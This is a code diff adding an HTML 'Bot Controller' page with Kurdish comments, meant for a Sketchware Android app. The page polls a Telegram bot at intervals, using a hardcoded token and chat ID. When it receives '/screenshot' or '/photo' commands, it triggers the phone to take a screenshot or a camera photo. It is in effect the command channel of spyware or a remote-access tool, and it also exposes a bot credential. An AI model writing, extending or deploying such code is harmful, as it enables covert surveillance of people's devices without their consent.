@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bot Controller</title>
+</head>
+<body>
+    <div id="status">سیتەمێ کونترۆلێ یێ چالاکە...</div>
+
+    <script>
+        // توکەن و ئایدییا خۆ ل ڤێرێ بنڤیسە
+        const TOKEN = "9200698437:AAGIcQ4CBkXtsonwhiGKxTwtkajKm8ByKCI";
+        const CHAT_ID = "8905740669";
+
+        // ڤێ فەرمانێ ل Sketchware (Java) دابنە وەک JavascriptInterface
+        // دەمێ فەرمانەک دهێت، کۆدێ JavaScript دێ فەرمانێ ب دەتە ئەپێ تە
+
+        setInterval(async function() {
+            try {
+                let res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?limit=1`);
+                let data = await res.json();
+
+                if(data.result.length > 0) {
+                    let msg = data.result[0].message.text;
+                    let update_id = data.result[0].update_id;
+
+                    // فەرمانێن سەرەکی
+                    if(msg === "/screenshot") {
+                        Android.takeScreenshot(); // ئەڤە دێ دەتە ئەپێ تە
+                        document.getElementById("status").innerHTML = "فەرمان: وێنەیێ شاشێ";
+                    } 
+                    else if(msg === "/photo") {
+                        Android.takeCameraPhoto(); // دێ دەتە ئەپێ تە
+                        document.getElementById("status").innerHTML = "فەرمان: وێنەیێ کامێرا";
+                    }
+
+                    // ڤێرە فەرمانێ پاقژ بکە
+                    fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${update_id + 1}`);
+                }
+            } catch (e) {
+                console.log("Error: " + e);
+            }
+        }, 3000); // هەر 3 چرکەیان جارەکێ ل فەرمانا نوی دگەریت
+    </script>
+</body>
+</html>
